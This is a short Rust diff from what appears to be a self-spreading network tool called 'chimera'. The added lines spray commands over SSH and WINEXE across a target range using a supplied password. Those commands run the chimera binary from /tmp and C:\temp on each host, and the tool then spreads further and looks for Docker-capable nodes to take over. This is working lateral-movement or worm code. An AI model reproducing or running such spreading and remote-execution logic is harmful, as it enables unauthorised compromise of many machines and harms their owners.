@@ -89,14 +89,28 @@ async fn main() {
     let start_tio = std::time::Instant::now();
     let mut x = crate::net::spread::spreader::Spreader::new(range, password).await;
 
+    let nix_cmd = format!("/tmp/chimera password");
+    let win_cmd = format!("C:\\temp\\chimera.exe password");
+
+
+    let cmd_futures = vec![
+        x.command_spray("SSH", &nix_cmd, vec![]),
+        x.command_spray("WINEXE", &win_cmd, vec![]),
+    ];
+
+    futures::future::join_all(cmd_futures).await;
+
     x.spread().await;
+
+    
 
     let golden_node;
 
     loop {
         if server_heap.lock().unwrap().len() <= 0 {
             panic!("No nodes suitable nodes found!");
-        } else if let Some(node) = server_heap.lock().unwrap().pop() {
+        } 
+        if let Some(node) = server_heap.lock().unwrap().pop() {
             println!("{:?}", node);
             if node.supports_docker {
                 golden_node = node;
